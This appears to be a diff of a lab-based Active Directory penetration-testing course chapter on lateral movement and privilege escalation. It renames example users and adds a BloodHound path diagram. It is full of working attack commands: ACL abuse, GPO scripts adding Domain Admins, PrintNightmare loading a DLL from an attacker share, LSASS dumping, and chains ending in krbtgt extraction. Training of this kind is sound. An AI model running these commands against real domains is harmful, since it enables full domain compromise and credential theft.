@@ -10,12 +10,30 @@ This chapter covers **LAT-001..035** and **PE-001..060** in `PLAN.md`. It is the
 
 ---
 
+## 11.0.1 (BloodHound) Lab Specific ACL Paths
+
+Before diving into host-level escalation, here is the explicit BloodHound path mapping for domain-level privilege escalation in the DVAD environment. These are the chains you will be executing:
+
+```mermaid
+graph LR
+    classDef user fill:#1d2b38,stroke:#00d2ff,stroke-width:2px,color:#fff;
+    classDef group fill:#3a1d38,stroke:#ff00d2,stroke-width:2px,color:#fff;
+
+    Dev[developer1]:::user -->|ForceChangePassword| Nick[nick.fury]:::user
+    Nick -->|WriteOwner| DA[Domain Admins]:::group
+    Nick -->|WriteSPN| SvcVision[svc_vision]:::user
+    QA[qa_user]:::user -->|AddSelf| Avengers[Avengers Admins]:::group
+    Shield[SHIELD Agents]:::group -->|GenericWrite| Avengers
+```
+
+---
+
 ## 11.0 (Concept) Lateral vs. vertical escalation
 
 ```
 +----------------------+               +----------------------+
 |  Host A              | --- lateral ---> | Host B             |
-|  user: alice (NT hash) |              |  user: alice (logged-on) |
+|  user: peter.parker (NT hash) |              |  user: peter.parker (logged-on) |
 +----------------------+               +----------------------+
         |                                          |
         | vertical privesc                         | vertical privesc
@@ -35,9 +53,9 @@ This chapter covers **LAT-001..035** and **PE-001..060** in `PLAN.md`. It is the
 
 The three escalation axes are *independent*. You can:
 
-- Land on Host A as `alice`, jump to Host B as `alice` (lateral), and never escalate vertically.
-- Land on Host A as `alice`, escalate to SYSTEM (vertical), and never move.
-- Combine: alice on Host A → SYSTEM on Host A → dump bob's creds → bob on Host B → bob is Domain Admin → done.
+- Land on Host A as `peter.parker`, jump to Host B as `peter.parker` (lateral), and never escalate vertically.
+- Land on Host A as `peter.parker`, escalate to SYSTEM (vertical), and never move.
+- Combine: peter.parker on Host A → SYSTEM on Host A → dump tony.stark's creds → tony.stark on Host B → tony.stark is Domain Admin → done.
 
 ---
 
@@ -82,7 +100,7 @@ Save the orientation output to disk **on the attacker side** so you don't risk l
 
 ```bash
 # From attacker, via SMB share of writable dir
-smbclient -U alice%'DVADlab2024!' //file01/share$ -c 'get oriented.txt'
+smbclient -U peter.parker%'DVADlab2024!' //file01/share$ -c 'get oriented.txt'
 ```
 
 ---
@@ -215,14 +233,14 @@ evil-winrm Kerberos auth requires `krb5.conf` properly set up:
 
 ```bash
 # kirbi (Mimikatz/Rubeus) → ccache (impacket)
-impacket-ticketConverter alice.kirbi alice.ccache
+impacket-ticketConverter peter.parker.kirbi peter.parker.ccache
 
 # ccache → kirbi
-impacket-ticketConverter alice.ccache alice.kirbi
+impacket-ticketConverter peter.parker.ccache peter.parker.kirbi
 
 # Inspect contents
-impacket-describeTicket alice.ccache
-klist -e -t -f -K alice.ccache    # MIT-Kerberos klist
+impacket-describeTicket peter.parker.ccache
+klist -e -t -f -K peter.parker.ccache    # MIT-Kerberos klist
 ```
 
 [Flags: LAT-019 — PTT-ccache; LAT-020 — PTK; LAT-021 — Golden injected; LAT-022 — Silver injected; LAT-023 — kirbi-conversion]
@@ -412,7 +430,7 @@ sc.exe \\dc01 start Browser
 Can load arbitrary printer drivers → PrintNightmare → SYSTEM on DC.
 
 ```bash
-python3 CVE-2021-1675.py corp.local/alice:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1\share\evil.dll'
+python3 CVE-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1\share\evil.dll'
 ```
 
 [Flag: PE-011 — Print Operators driver load]
@@ -500,8 +518,8 @@ All-of-everything in one domain. The usual target.
 See chapter 4 / 12 for the deep flow. The escalation use is to *seed* persistent privilege as you also use it for re-entry.
 
 ```bash
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
-    add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' alice
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+    add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' peter.parker
 ```
 
 [Flag: PE-020 / PER-014 — AdminSDHolder ACE]
@@ -515,7 +533,7 @@ You have write on a GPO. Add a startup script or scheduled-task immediate item t
 ### SharpGPOAbuse (preferred)
 
 ```cmd
-SharpGPOAbuse.exe --AddComputerScript --GPOName "Default Domain Policy" --ScriptName evil.bat --ScriptContents "net group 'Domain Admins' alice /add /domain"
+SharpGPOAbuse.exe --AddComputerScript --GPOName "Default Domain Policy" --ScriptName evil.bat --ScriptContents "net group 'Domain Admins' peter.parker /add /domain"
 
 SharpGPOAbuse.exe --AddUserStartupScript --GPOName "User GPO" --ScriptName login.bat --ScriptContents "powershell -enc <b64>"
 
@@ -525,8 +543,8 @@ SharpGPOAbuse.exe --AddImmediateTask --TaskName "Daily Sync" --Author "NT AUTHOR
 ### pyGPOAbuse / bloodyAD
 
 ```bash
-python3 pygpoabuse.py corp.local/alice:'DVADlab2024!' -gpo-id <GUID> -f
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+python3 pygpoabuse.py corp.local/peter.parker:'DVADlab2024!' -gpo-id <GUID> -f
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
     gpoadd  ...  # newer bloodyAD versions
 ```
 
@@ -571,42 +589,42 @@ You have a privileged ACE on a target object. Use it.
 
 ```bash
 # Password reset
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
     set password victim 'NewPass1!'
-net rpc password victim 'NewPass1!' -U corp.local/alice%'DVADlab2024!' -S 10.10.0.10
+net rpc password victim 'NewPass1!' -U corp.local/peter.parker%'DVADlab2024!' -S 10.10.0.10
 
 # Add to group
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
-    add groupMember "Domain Admins" alice
-net rpc group addmem "Domain Admins" alice -U corp.local/alice%'DVADlab2024!' -S 10.10.0.10
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+    add groupMember "Domain Admins" peter.parker
+net rpc group addmem "Domain Admins" peter.parker -U corp.local/peter.parker%'DVADlab2024!' -S 10.10.0.10
 
 # Set SPN
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
     add objectAttribute victim servicePrincipalName 'cifs/anything.corp.local'
 
 # Plant Shadow Credential
-certipy shadow auto -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -account victim$
+certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -account victim$
 
 # Set RBCD
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
     set rbcd FILE01$ EVIL$
-impacket-rbcd corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-rbcd corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -delegate-from 'EVIL$' -delegate-to 'FILE01$' -action write
 
 # WriteDacl → grant yourself GenericAll
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
-    add genericAll victim alice
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+    add genericAll victim peter.parker
 
 # WriteOwner → take ownership
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
-    set owner victim alice
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+    set owner victim peter.parker
 # Then WriteDacl, then GenericAll, then anything.
 ```
 
 ### Discovery — finding usable ACEs
 
 ```cypher
-// BloodHound: every ACE alice has on any object
+// BloodHound: every ACE peter.parker has on any object
 MATCH p=(u:User {name:'ALICE@CORP.LOCAL'})-[r]->(o)
 WHERE type(r) IN ['GenericAll','GenericWrite','WriteDacl','WriteOwner',
                    'AddMember','ForceChangePassword','AllExtendedRights',
@@ -614,10 +632,12 @@ WHERE type(r) IN ['GenericAll','GenericWrite','WriteDacl','WriteOwner',
 RETURN p
 ```
 
+*(Note: Within the DVAD BloodHound map, look out for specifically crafted chains such as `developer1` having `ForceChangePassword` on `nick.fury`, `nick.fury` having `WriteOwner` over `Domain Admins`, or `peter.parker` holding `GenericAll` over `tony.stark`.)*
+
 Or:
 
 ```bash
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
     get writable
 ```
 
@@ -664,10 +684,10 @@ Check `PLAN.md` for the canonical PE list per host.
 DVAD's file01 may run an OpenSSH for Windows service. Move laterally:
 
 ```bash
-ssh alice@10.10.0.13
+ssh peter.parker@10.10.0.13
 
 # With captured private key from share scrape
-ssh -i alice.key alice@10.10.0.13
+ssh -i peter.parker.key peter.parker@10.10.0.13
 ```
 
 OpenSSH-for-Windows defaults: keys in `C:\Users\<user>\.ssh\authorized_keys`. The `administrators_authorized_keys` file in `C:\ProgramData\ssh\` is a global override for any admin login.
@@ -759,8 +779,8 @@ WinRM is SOAP-over-HTTP(S) on 5985/5986. Auth via NTLM (default) or Kerberos (`-
 ### `runas /netonly` (when you have a different cred set than your shell)
 
 ```cmd
-runas /netonly /user:corp.local\alice powershell.exe
-# In the spawned shell, all network calls use alice's creds; local calls still use original
+runas /netonly /user:corp.local\peter.parker powershell.exe
+# In the spawned shell, all network calls use peter.parker's creds; local calls still use original
 ```
 
 ### Token theft via Incognito (Meterpreter) or SharpToken
@@ -775,7 +795,7 @@ Steals an existing primary or impersonation token from another process — works
 ### PowerShell `Invoke-Command` with different creds
 
 ```powershell
-$cred = New-Object System.Management.Automation.PSCredential('corp\bob',(ConvertTo-SecureString 'P@ss' -AsPlainText -Force))
+$cred = New-Object System.Management.Automation.PSCredential('corp\tony.stark',(ConvertTo-SecureString 'P@ss' -AsPlainText -Force))
 Invoke-Command -ComputerName file01 -Credential $cred -ScriptBlock { whoami }
 ```
 
@@ -856,7 +876,7 @@ If Tamper Protection is on, you need to disable it from Settings (interactive) o
 ### lsassy
 
 ```bash
-lsassy -u alice -p 'DVADlab2024!' -d corp.local -M procdump 10.10.0.13
+lsassy -u peter.parker -p 'DVADlab2024!' -d corp.local -M procdump 10.10.0.13
 # Methods: procdump, comsvcs, dllinject, mirrordump, dumpert, nanodump, ppldump
 ```
 
@@ -908,52 +928,52 @@ The defender's job is to break the chain at the tier boundary. Each ACL drift ac
 
 ## 11.20 Practical chains — five worked examples
 
-### Chain A: alice → DA via Kerberoast
+### Chain A: peter.parker → DA via Kerberoast
 
 ```
-1. alice has any-user creds → BloodHound
-2. Kerberoast svc_sql → hashcat → SqlServer123!
-3. svc_sql is DA (DVAD seeds this) → impacket-secretsdump krbtgt
+1. peter.parker has any-user creds → BloodHound
+2. Kerberoast svc_jarvis → hashcat → SqlServer123!
+3. svc_jarvis is DA (DVAD seeds this) → impacket-secretsdump krbtgt
 ```
 
-### Chain B: alice → DA via ESC1
+### Chain B: peter.parker → DA via ESC1
 
 ```
-1. alice → BloodHound → "VulnerableESC1" template
+1. peter.parker → BloodHound → "VulnerableESC1" template
 2. certipy req with -upn administrator@corp.local
 3. certipy auth → Administrator NT hash
 4. impacket-secretsdump → krbtgt
 ```
 
-### Chain C: alice → DA via Coerce + ESC8
+### Chain C: peter.parker → DA via Coerce + ESC8
 
 ```
-1. alice → BloodHound → ESC8 vuln on CA01
+1. peter.parker → BloodHound → ESC8 vuln on CA01
 2. ntlmrelayx -t http://ca01/certsrv/ --adcs --template DomainController
 3. PetitPotam dc01 → relay → cert for DC01$
 4. certipy auth → DC01$ NT hash
 5. impacket-secretsdump krbtgt
 ```
 
-### Chain D: alice → DA via Backup Operators (gMSA pivot)
+### Chain D: peter.parker → DA via Backup Operators (gMSA pivot)
 
 ```
-1. alice → GenericWrite on Backup-Readers group
-2. Add alice to Backup-Readers
+1. peter.parker → GenericWrite on Backup-Readers group
+2. Add peter.parker to Backup-Readers
 3. gMSADumper.py → svc_backup$ NT hash (svc_backup is Backup Operators)
 4. evil-winrm to DC as svc_backup → reg save SAM SYSTEM NTDS.dit
 5. impacket-secretsdump LOCAL → krbtgt
 ```
 
-### Chain E: alice → DA via RBCD chain (PE/LAT mix)
+### Chain E: peter.parker → DA via RBCD chain (PE/LAT mix)
 
 ```
-1. alice → BloodHound → GenericWrite on FILE01$
+1. peter.parker → BloodHound → GenericWrite on FILE01$
 2. impacket-addcomputer EVIL$
 3. impacket-rbcd write FILE01$ ← EVIL$
 4. impacket-getST -spn cifs/file01 -impersonate Administrator
-5. Admin on file01 → mimikatz → bob hash
-6. bob is local admin on dc01 → PTH
+5. Admin on file01 → mimikatz → tony.stark hash
+6. tony.stark is local admin on dc01 → PTH
 7. reg save NTDS → secretsdump → krbtgt
 ```
 
@@ -1002,11 +1022,11 @@ Land as a local admin on ws01 (with split token). Use fodhelper bypass to get an
 
 ### Exercise 11.G — LOLBin lateral
 
-Use only LOLBins (no impacket scripts) to laterally move alice → bob on file01. Document each step.
+Use only LOLBins (no impacket scripts) to laterally move peter.parker → tony.stark on file01. Document each step.
 
 ### Exercise 11.H — Cross-tier path
 
-Map the full path alice (Tier-2 user) → DA (Tier-0). Identify every tier boundary you cross and whether it would have been blocked by tiered admin model + LAPS + signing.
+Map the full path peter.parker (Tier-2 user) → DA (Tier-0). Identify every tier boundary you cross and whether it would have been blocked by tiered admin model + LAPS + signing.
 
 ### Exercise 11.I — Quietest psexec alternative
 
@@ -1022,12 +1042,12 @@ Rank by stealth.
 
 ### Exercise 11.J — ACL escalation through three steps
 
-Set up a deliberately convoluted ACL: alice → WriteOwner on Bob, Bob → GenericWrite on Domain Admins. Use bloodyAD to:
+Set up a deliberately convoluted ACL: `developer1` → WriteSPN on tony.stark (or use the lab's built-in `developer1` → ForceChangePassword on `nick.fury`, and `nick.fury` → WriteOwner on Domain Admins). Use bloodyAD to:
 
-1. Take ownership of Bob.
-2. Grant alice GenericAll on Bob.
-3. Reset Bob's password.
-4. As Bob, add alice to Domain Admins.
+1. Take ownership of tony.stark.
+2. Grant peter.parker GenericAll on tony.stark.
+3. Reset tony.stark's password.
+4. As tony.stark, add peter.parker to Domain Admins.
 
 ---
 
